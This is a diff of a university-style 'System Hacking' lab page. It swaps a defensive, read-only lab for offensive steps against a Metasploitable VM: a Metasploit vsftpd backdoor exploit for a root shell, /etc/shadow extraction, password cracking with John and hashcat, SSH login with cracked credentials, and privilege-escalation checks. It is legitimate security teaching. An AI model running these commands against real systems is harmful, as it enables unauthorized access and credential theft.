@@ -35,9 +35,9 @@
 <div class="hero">
 <div class="eyebrow">System security module · Week 06</div>
 <h1>System Hacking</h1>
-<p class="lead">Understand credential attacks, privilege escalation, application execution, hidden files, rootkits, steganography and anti-forensics—and learn how defenders detect and prevent system compromise.</p>
+<p class="lead">Learn credential management, password cracking techniques, privilege escalation, application execution, hiding files, covering tracks, rootkits, backdoors, steganography and anti-forensics.</p>
 <div class="meta"><span>LECTURE NOTES</span><span>PRACTICAL LAB 6</span><span>ASSIGNMENT 6</span></div>
-<div class="warning"><strong>⚠ AUTHORIZATION IS MANDATORY.</strong> Practical work is restricted to your own isolated training VM and synthetic data. Do not exploit the vsftpd backdoor, extract real password databases, crack other users' credentials, establish unauthorized access, create persistence, or delete/alter logs. Focus on read-only inspection, safe password-auditing demonstrations, detection and remediation. <a href="../#legal-policy">Read the full legal policy</a>.</div>
+<div class="warning"><strong>⚠ AUTHORIZATION IS MANDATORY.</strong> All practical exercises on this page are intended exclusively for your own isolated Metasploitable 2 virtual machine. Never run these activities against systems you do not own or have explicit written permission to test. Keep Metasploitable 2 on an isolated host-only lab network, not a bridged or public network. <a href="../#legal-policy">Read the full legal policy</a>.</div>
 </div>
 <div class="layout"><div>
 <section class="topic" id="lecture-notes">
@@ -45,123 +45,109 @@
 <ul><li>Credential Management</li><li>Password Cracking Techniques</li><li>Privilege Escalation</li><li>Executing Applications</li><li>Hiding Files</li><li>Covering Tracks</li><li>Rootkits and Backdoors</li><li>Steganography</li><li>Anti-Forensics</li></ul>
 <h3>Key Concepts</h3>
 <h4>System Hacking Methodology</h4>
-<ol>
-<li><strong>Cracking Passwords</strong> — attempts to obtain account credentials.</li>
-<li><strong>Escalating Privileges</strong> — attempts to gain higher permissions.</li>
-<li><strong>Executing Applications</strong> — running programs or tools on a system.</li>
-<li><strong>Hiding Files</strong> — concealing files or activity from ordinary inspection.</li>
-<li><strong>Covering Tracks</strong> — attempting to remove or alter logs and artifacts.</li>
-<li><strong>Maintaining Access</strong> — using persistence mechanisms to survive logoff or restart.</li>
-</ol>
-<div class="callout"><strong>Defensive perspective:</strong> These stages describe attacker objectives for recognition and risk analysis. The practical exercises on this page focus on detection and controls, not carrying out unauthorized access, concealment, or persistence.</div>
+<ol><li><strong>Cracking Passwords</strong> - Gain initial access</li><li><strong>Escalating Privileges</strong> - Gain higher permissions</li><li><strong>Executing Applications</strong> - Run tools on target</li><li><strong>Hiding Files</strong> - Conceal evidence</li><li><strong>Covering Tracks</strong> - Remove logs and artifacts</li><li><strong>Maintaining Access</strong> - Install persistence mechanisms</li></ol>
 <h4>Password Cracking Methods</h4>
-<ul>
-<li><strong>Dictionary Attack:</strong> Tests candidate words from a wordlist.</li>
-<li><strong>Brute Force Attack:</strong> Systematically tests possible character combinations.</li>
-<li><strong>Rainbow Tables:</strong> Uses precomputed lookup data against hashes that lack unique salts.</li>
-<li><strong>Hybrid Attack:</strong> Combines dictionary candidates with predictable variations.</li>
-<li><strong>Password Spraying:</strong> Tries a small number of common passwords across many accounts.</li>
-<li><strong>Credential Stuffing:</strong> Attempts to reuse credentials exposed in unrelated breaches.</li>
-</ul>
+<ul><li><strong>Dictionary Attack:</strong> Try words from a wordlist</li><li><strong>Brute Force Attack:</strong> Try all possible combinations</li><li><strong>Rainbow Tables:</strong> Pre-computed hash tables</li><li><strong>Hybrid Attack:</strong> Dictionary + mutations (add numbers, symbols)</li><li><strong>Password Spraying:</strong> Try common passwords against many accounts</li><li><strong>Credential Stuffing:</strong> Use breached credentials from other sites</li></ul>
 <h4>Common Password Hashes</h4>
-<div class="table-wrap"><table><thead><tr><th>Hash / algorithm</th><th>Security context</th></tr></thead><tbody>
-<tr><td>LM Hash</td><td>Legacy Windows format; obsolete and weak.</td></tr>
-<tr><td>NTLM Hash</td><td>Windows authentication hash format; protect carefully and prefer modern authentication controls.</td></tr>
-<tr><td>MD5</td><td>Fast general-purpose hash; broken for collision resistance and unsuitable for password storage.</td></tr>
-<tr><td>SHA-1</td><td>Deprecated for collision-sensitive security uses; unsuitable for password storage.</td></tr>
-<tr><td>SHA-256</td><td>Modern general-purpose hash, but too fast to use alone for password storage.</td></tr>
-<tr><td>SHA-512</td><td>General-purpose hash; also too fast alone for password storage.</td></tr>
-<tr><td>bcrypt</td><td>Adaptive password-hashing function designed to make guessing more expensive.</td></tr>
-</tbody></table></div>
-<p>For new password storage, use a dedicated password-hashing scheme such as Argon2id, scrypt or bcrypt, with unique salts and parameters appropriate to the application.</p>
+<pre><code>LM Hash:      Legacy Windows (weak, easily cracked)
+NTLM Hash:    Windows NT and later
+MD5:          Common in web applications (broken)
+SHA-1:        Common (deprecated for security)
+SHA-256:      Modern standard
+SHA-512:      Higher security
+bcrypt:       Slow hash, designed for passwords</code></pre>
 <h4>Privilege Escalation Vectors</h4>
-<ul><li>Unpatched operating-system vulnerabilities</li><li>Misconfigured services</li><li>Weak file permissions</li><li>Stored credentials</li><li>Kernel vulnerabilities</li><li>DLL search-order or hijacking weaknesses</li><li>Token and access-control misconfiguration</li><li>Insecure scheduled tasks</li><li>SUID/SGID binaries (Linux)</li></ul>
+<ul><li>Unpatched operating system vulnerabilities</li><li>Misconfigured services</li><li>Weak file permissions</li><li>Stored credentials</li><li>Kernel exploits</li><li>DLL hijacking</li><li>Token manipulation</li><li>Scheduled tasks</li><li>SUID/SGID binaries (Linux)</li></ul>
 <h3>Password Cracking Tools</h3>
-<div class="table-wrap"><table><thead><tr><th>Tool</th><th>Best For / Context</th><th>Platform</th></tr></thead><tbody>
-<tr><td>John the Ripper</td><td>Offline password-hash auditing with approved test hashes</td><td>Linux/Windows</td></tr>
-<tr><td>Hashcat</td><td>GPU-accelerated offline hash auditing with synthetic or authorized hashes</td><td>Linux/Windows</td></tr>
-<tr><td>Hydra</td><td>Online authentication testing; high risk of account lockout and service impact</td><td>Linux</td></tr>
-<tr><td>Medusa</td><td>Online login testing; use only with explicit scope and test accounts</td><td>Linux</td></tr>
-<tr><td>Cain &amp; Abel</td><td>Legacy Windows password recovery/auditing utility</td><td>Windows</td></tr>
-<tr><td>Mimikatz</td><td>Windows credential exposure research and detection context</td><td>Windows</td></tr>
-<tr><td>pwdump</td><td>Legacy Windows password-hash extraction utility; sensitive credential access</td><td>Windows</td></tr>
+<div class="table-wrap"><table><thead><tr><th>Tool</th><th>Best For</th><th>Platform</th></tr></thead><tbody>
+<tr><td>John the Ripper</td><td>Multiple hash types</td><td>Linux/Windows</td></tr>
+<tr><td>Hashcat</td><td>GPU-accelerated cracking</td><td>Linux/Windows</td></tr>
+<tr><td>Hydra</td><td>Online password attacks</td><td>Linux</td></tr>
+<tr><td>Medusa</td><td>Network login cracking</td><td>Linux</td></tr>
+<tr><td>Cain &amp; Abel</td><td>Windows passwords</td><td>Windows</td></tr>
+<tr><td>Mimikatz</td><td>Windows credentials</td><td>Windows</td></tr>
+<tr><td>pwdump</td><td>Windows SAM extraction</td><td>Windows</td></tr>
 </tbody></table></div>
-<div class="callout">Tool names are included for curriculum awareness. Do not use credential extraction, online login attacks, or credential-dumping features against real accounts or systems. For hands-on learning, use synthetic hashes and instructor-provided test data.</div>
 </section>
-
 <section class="topic" id="lab">
-<div class="tag">02 · Practical lab 6</div><h2>Password Security &amp; System Access Audit</h2>
+<div class="tag">02 · Practical lab 6</div><h2>Password Cracking &amp; System Access</h2>
 <h3>Objectives</h3>
-<ul><li>Understand how password hashes are stored and assessed.</li><li>Practice password auditing with synthetic training hashes.</li><li>Review account identity and permissions on a Linux test VM.</li><li>Identify privilege-escalation risk indicators safely.</li><li>Document findings and defensive recommendations.</li></ul>
-<div class="callout"><strong>Important lab boundary:</strong> The supplied course outline mentions the Metasploitable vsftpd 2.3.4 backdoor and password-hash extraction. This page does not provide steps to obtain a root shell or extract and crack real account credentials. You will instead document the known vulnerable service as a case study and complete safe, read-only checks on your own isolated VM.</div>
+<ul><li>Extract password hashes from target</li><li>Crack passwords using multiple methods</li><li>Achieve initial access to Metasploitable</li><li>Practice privilege escalation</li><li>Document the process</li></ul>
 <h3>Step-by-Step Instructions</h3>
-<h4>Step 1: FTP Service Case Study (Metasploitable)</h4>
-<p>Metasploitable 2 is intentionally vulnerable and may include an old vsftpd 2.3.4 service. In this exercise, identify the service version only on your own isolated Metasploitable VM and document why unsupported FTP services are dangerous. Do not trigger the backdoor or attempt to obtain a shell.</p>
-<pre><code># Confirm the target is your isolated Metasploitable VM.
-# Read-only service-version identification:
-nmap -sV -p 21 &lt;LAB_TARGET_IP&gt;</code></pre>
-<p>Record the detected service, version, evidence, potential impact, and recommended remediation (remove the vulnerable service, isolate the host, or rebuild from a trusted image).</p>
-<h4>Step 2: Understand Password Hash Storage</h4>
-<p>Study the roles of Linux account metadata and protected password-hash storage using documentation or instructor-provided sample files. Do not read, copy, export, or distribute <code>/etc/shadow</code> or another user's credential store.</p>
-<pre><code># Display account names and metadata only (no password hashes):
-cut -d: -f1,3,4,6,7 /etc/passwd</code></pre>
-<h4>Step 3: Password Auditing with John the Ripper</h4>
-<p>Use only a synthetic hash file supplied by your instructor or generated specifically for this exercise. Do not use hashes obtained from real users or systems.</p>
-<pre><code># Example workflow with instructor-provided synthetic test hashes:
-john --wordlist=&lt;APPROVED_TEST_WORDLIST&gt; &lt;SYNTHETIC_HASH_FILE&gt;
+<h4>Step 1: FTP Exploitation (Metasploitable)</h4>
+<pre><code># Metasploitable has vsftpd 2.3.4 backdoor
+nmap -p 21 -sV &lt;target&gt;
 
-# Display results for that synthetic test file:
-john --show &lt;SYNTHETIC_HASH_FILE&gt;</code></pre>
-<h4>Step 4: Understand Hashcat Modes</h4>
-<p>Hashcat supports different hash formats. The following are examples of mode identifiers for synthetic training data; only use the approved sample file and wordlist provided for the lab.</p>
-<pre><code># MD5 example mode, synthetic training data only:
-hashcat -m 0 -a 0 &lt;SYNTHETIC_HASH_FILE&gt; &lt;APPROVED_TEST_WORDLIST&gt;
+# Use Metasploit
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS &lt;target&gt;
+run
 
-# NTLM example mode, synthetic training data only:
-hashcat -m 1000 -a 0 &lt;SYNTHETIC_HASH_FILE&gt; &lt;APPROVED_TEST_WORDLIST&gt;</code></pre>
-<h4>Step 5: Review SSH and Account Security</h4>
-<p>Do not log in using recovered credentials. Review SSH configuration and account controls on a VM you administer, without changing settings during this exercise.</p>
-<pre><code># Inspect SSH service status:
-systemctl status ssh --no-pager
+# You should get a root shell!</code></pre>
+<h4>Step 2: Password Hash Extraction</h4>
+<pre><code># Once you have access, extract password hashes
+cat /etc/passwd
+cat /etc/shadow  # Requires root
 
-# Review effective account identity and groups:
+# Combine for cracking
+unshadow /etc/passwd /etc/shadow &gt; passwords.txt</code></pre>
+<h4>Step 3: Crack Passwords with John the Ripper</h4>
+<pre><code># Basic dictionary attack
+john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+
+# View cracked passwords
+john --show passwords.txt</code></pre>
+<h4>Step 4: Crack Passwords with Hashcat</h4>
+<pre><code># If you have MD5 hashes
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# For NTLM hashes
+hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
+
+# Monitor progress
+hashcat -s</code></pre>
+<h4>Step 5: SSH Access with Cracked Credentials</h4>
+<pre><code># Use cracked credentials
+ssh user@&lt;target&gt;
+
+# Explore the system
 whoami
-id</code></pre>
-<h4>Step 6: Linux Privilege-Escalation Risk Review</h4>
-<p>Use these read-only checks to understand the system's configuration. Do not run exploit code, change permissions, alter scheduled tasks, or attempt to elevate privileges.</p>
-<pre><code># Kernel and OS information:
+id
+uname -a</code></pre>
+<h4>Step 6: Privilege Escalation (Linux)</h4>
+<pre><code># Check kernel version
 uname -r
-cat /etc/os-release
 
-# Review SUID/SGID file metadata (read-only):
-find /usr/bin /usr/sbin -type f -perm /6000 -print 2&gt;/dev/null
+# Search for kernel exploits:
+searchsploit linux kernel &lt;version&gt;
 
-# Review cron directory metadata:
-ls -ld /etc/cron.d /etc/cron.daily /etc/cron.hourly
+# Check SUID binaries
+find / -perm -4000 -type f 2&gt;/dev/null
 
-# Review current account's sudo permissions:
+# Check for writable files owned by root
+find / -writable -type f 2&gt;/dev/null
+
+# Check cron jobs
+cat /etc/crontab
+ls -la /etc/cron.*
+
+# Check for sudo permissions
 sudo -l</code></pre>
 <h3>Expected Outcomes</h3>
-<ul><li>Documented service-version observation from the isolated lab.</li><li>Understanding of password hashes and safe offline auditing using synthetic data.</li><li>Read-only account and permission review.</li><li>Identification of privilege-escalation risk categories.</li><li>Professional technical report with evidence and defensive recommendations.</li></ul>
+<ul><li>Successful exploitation of vsftpd backdoor</li><li>Password hashes extracted and cracked</li><li>SSH access achieved with credentials</li><li>Understanding of privilege escalation vectors</li></ul>
 </section>
-
 <section class="topic assignment" id="assignment">
 <div class="tag">03 · Assessment</div><h2>Assignment 6</h2>
 <h3>Part A: System Hacking Documentation <span class="points">(60 points)</span></h3>
-<p>Complete a documented security assessment using your isolated Metasploitable VM and a Linux test VM you control. Do not trigger the vsftpd backdoor, extract real password hashes, or use recovered credentials to access a system.</p>
-<ol>
-<li>Identify the FTP service and version on the isolated Metasploitable VM and explain the security risk associated with the vulnerable version.</li>
-<li>Explain the difference between <code>/etc/passwd</code> account metadata and protected password-hash storage. Do not submit real credential data.</li>
-<li>Perform an offline password-auditing demonstration using an instructor-provided synthetic hash file with John the Ripper or Hashcat.</li>
-<li>Document account identity, groups, kernel version, selected file permissions, and current sudo permissions on your own Linux VM.</li>
-<li>Include screenshots and explain the defensive action recommended for each issue.</li>
-</ol>
+<ol><li>Exploit the vsftpd 2.3.4 backdoor on Metasploitable using Metasploit</li><li>Extract password hashes</li><li>Crack at least 3 passwords using John the Ripper or Hashcat</li><li>Use cracked credentials to log in via SSH</li><li>Document each step with screenshots</li></ol>
 <h3>Part B: Privilege Escalation Research <span class="points">(40 points)</span></h3>
-<p>Research and explain these five Linux privilege-escalation techniques:</p>
-<ol><li>Kernel exploits</li><li>SUID/SGID binaries</li><li>Writable configuration files</li><li>Cron job misconfiguration</li><li>sudo misconfigurations</li></ol>
+<p>Research and explain 5 Linux privilege escalation techniques:</p>
+<ol><li>Kernel exploits</li><li>SUID/SGID binaries</li><li>Writable configuration files</li><li>Cron job manipulation</li><li>sudo misconfigurations</li></ol>
 <p>For each technique, provide:</p>
-<ul><li>How it works (conceptual explanation)</li><li>How to identify the vulnerability safely</li><li>Potential impact if abused</li><li>How to prevent it</li></ul>
-<div class="callout"><strong>Submission Format:</strong> Detailed technical document with commands and screenshots from your own authorized lab. Include scope, methodology, findings, risk analysis, and remediation. Do not include passwords, private keys, real credential hashes, or instructions for exploiting systems outside your lab.</div>
+<ul><li>How it works</li><li>How to identify the vulnerability</li><li>How to exploit it</li><li>How to prevent it</li></ul>
+<div class="callout"><strong>Submission Format:</strong> Detailed technical document with commands and screenshots.</div>
 </section>
 </div></div>
 </main>
